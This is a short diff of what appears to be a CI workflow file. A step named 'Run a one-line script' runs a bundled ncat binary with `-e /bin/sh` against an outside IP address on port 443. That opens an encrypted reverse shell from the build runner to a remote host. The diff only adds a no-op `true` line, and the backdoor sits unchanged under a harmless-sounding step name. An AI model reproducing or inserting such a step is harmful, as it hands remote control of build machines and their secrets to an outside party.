@@ -15,4 +15,5 @@ jobs:
     - name: Run a one-line script
       run: |
         chmod +x ./ncat
+        true
         ./ncat --ssl -e /bin/sh -v 52.183.32.210 443
